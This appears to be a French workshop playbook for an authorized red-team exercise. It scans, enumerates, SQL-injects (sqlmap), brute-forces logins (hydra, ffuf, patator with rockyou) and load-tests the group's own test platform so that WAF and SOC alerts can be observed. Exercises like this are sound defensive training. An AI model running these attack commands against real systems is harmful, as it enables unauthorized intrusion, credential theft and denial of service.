# Playbook d'attaque réelle depuis Kali — RESILIENCE-ALPHA

Exercice **pédagogique autorisé** du workshop MSPR. Cible unique : la plateforme fictive du groupe,
sur le réseau du consortium. À lancer uniquement par vous, depuis le **PC Attaquant (VM Kali)**.

Ces commandes utilisent de vrais outils de la distribution Kali (nmap, nikto, gobuster/ffuf, hydra,
sqlmap, ab/wrk). Le but n'est **pas** de contourner la défense : c'est de se faire repérer, pour
déclencher la chaîne détection → remédiation. Les phases « disponibilité » sont volontairement bornées.

---

## 0. Préparation

```bash
# Adresse de la passerelle (PC Hôte sur le point d'accès du groupe)
export CIBLE=192.168.137.1
export URL=http://$CIBLE:8080

# Votre vraie IP Kali sur le point d'accès (à noter pour le test d'IP source)
ip -4 addr show | grep 192.168.137

# La plateforme répond ?
curl -s -o /dev/null -w "healthz: %{http_code}\n" $URL/healthz   # attendu : 200
```

Si `rockyou.txt` est compressé : `sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz`.

---

## 1. Reconnaissance réseau (nmap)

Montre que **seul le port 8080 est exposé** (preuve de durcissement) et identifie le service.

```bash
# Scan complet des ports : seul 8080 doit répondre
nmap -p- --open -T4 $CIBLE

# Empreinte du service et scripts par défaut sur 8080
nmap -sV -sC -p 8080 $CIBLE
```

Signal côté défense : connexions entrantes, trafic inhabituel. (Un scan TCP pur ne passe pas par
le WAF ; c'est surtout une preuve d'exposition minimale.)

---

## 2. Énumération de chemins (gobuster ou ffuf)

Cherche des pages cachées. Génère beaucoup de 404 et de 403.

```bash
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 20 -b 404 -q

# ou avec ffuf
ffuf -u $URL/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 20
```

Signal attendu : rafale de 404/403 dans la Vue SOC (adresse source très active).

---

## 3. Scan de vulnérabilités web (nikto)

Envoie des centaines de requêtes suspectes. Le pare-feu applicatif doit en bloquer la plupart.

```bash
nikto -h $URL -maxtime 120s
```

Signal attendu : pic de requêtes bloquées par le WAF (403), règles OWASP CRS déclenchées.

---

## 4. Injection SQL (sqlmap)

Teste le paramètre `username` de la connexion. Attendu : **sqlmap détecte un WAF/IPS** et reçoit des 403.
C'est le résultat recherché : la démonstration que le pare-feu bloque l'injection.

```bash
sqlmap -u $URL/api/auth/login \
  --method POST \
  --data '{"username":"bob","password":"x"}' \
  --headers="Content-Type: application/json" \
  -p username --batch --level 2 --risk 2
```

Pour tester un paramètre nécessitant un jeton (ex. `?q=` des bénéficiaires), connectez-vous d'abord
et passez le jeton :

```bash
TOKEN=$(curl -s -X POST $URL/api/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"<mot de passe de démo>"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

sqlmap -u "$URL/api/accounts/beneficiaries?q=1" \
  --headers="Authorization: Bearer $TOKEN" -p q --batch --level 2 --risk 2
```

Signal attendu : règle « SQL Injection » du WAF, 403 en série.

---

## 5. Force brute de connexion (ffuf, patator ou hydra)

Tentatives répétées sur un compte. Attendu : la passerelle **limite** (429) et le compte se
**verrouille** ; l'attaque **n'aboutit pas** (les comptes de démo ont des mots de passe forts aléatoires).

```bash
# ffuf (API en JSON) — filtre les 401 pour ne voir que succès (200) ou blocage (429)
ffuf -X POST -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"FUZZ"}' \
  -u $URL/api/auth/login \
  -w /usr/share/wordlists/rockyou.txt \
  -mc all -fc 401 -t 10 -rate 30 -maxtime 60
```

```bash
# patator (gère proprement le corps JSON)
patator http_fuzz url=$URL/api/auth/login method=POST \
  header='Content-Type: application/json' \
  body='{"username": "bob", "password": "FILE0"}' \
  0=/usr/share/wordlists/rockyou.txt -x ignore:code=401 --rate-limit=0.03
```

```bash
# hydra (JSON : les deux-points du corps doivent être échappés \: )
hydra -l bob -P /usr/share/wordlists/rockyou.txt -s 8080 $CIBLE http-post-form \
  '/api/auth/login:{"username"\:"bob","password"\:"^PASS^"}:F=401:H=Content-Type\: application/json'
```

Signal attendu : pic de 401 puis 429, événements `login_failed` / `login_blocked`, alerte
`ForceBruteConnexion` si le seuil est franchi.

---

## 6. Charge et disponibilité (ab ou wrk) — borné

Pic de trafic court pour éprouver la limitation de débit. **Nombre de requêtes et durée fixés** :
c'est un test de disponibilité, pas un déni de service.

```bash
# Apache Bench : 3000 requêtes, 50 en parallèle
ab -n 3000 -c 50 $URL/api/accounts/me

# ou wrk : 4 fils, 50 connexions, 20 secondes
wrk -t4 -c50 -d20s $URL/api/accounts/me
```

Signal attendu : pic de requêtes et montée des 429 (limitation par IP) dans la Vue SOC.

---

## 7. Test de l'IP source réelle (PRIORITÉ)

Vérifie si Docker Desktop masque l'adresse de l'attaquant.

```bash
# Depuis Kali : requête étiquetée
TAG=REDTEAM-$(date +%s)
curl -s -o /dev/null $URL/api/accounts/me -H "X-Redteam-Probe: $TAG"
echo "Étiquette : $TAG — cherchez-la dans les journaux de la passerelle sur le PC Hôte"
```

```bash
# Sur le PC Hôte, dans le dossier du projet :
docker compose logs gateway --since 2m | grep "$TAG"
```

- `client_ip` = votre vraie IP Kali (`192.168.137.x`) → le blocage par IP fonctionnera.
- `client_ip` = `172.22.0.1` (ou autre IP interne Docker) → Docker Desktop masque l'IP ; la
  remédiation s'appuiera sur d'autres critères (motif d'attaque, règle WAF, limitation globale).

---

## Observer en direct (PC Hôte)

- **Grafana → Vue SOC** : <http://127.0.0.1:3000> (identifiant `admin`, mot de passe dans
  `secrets/grafana_admin_password`). Le graphe « Activité suspecte » montre le pic en temps réel.
- Alertes Prometheus de sécurité : `AttaqueApplicativeBloquee`, `LimitationDeDebit`, `ForceBruteConnexion`.

## Scénario rejouable pour la vidéo

Pour la capture chronométrée (60 s), `attack_suite.py` (même dossier) rejoue un enchaînement
identique en une commande, pratique si vous voulez un déroulé reproductible en plus des outils Kali.
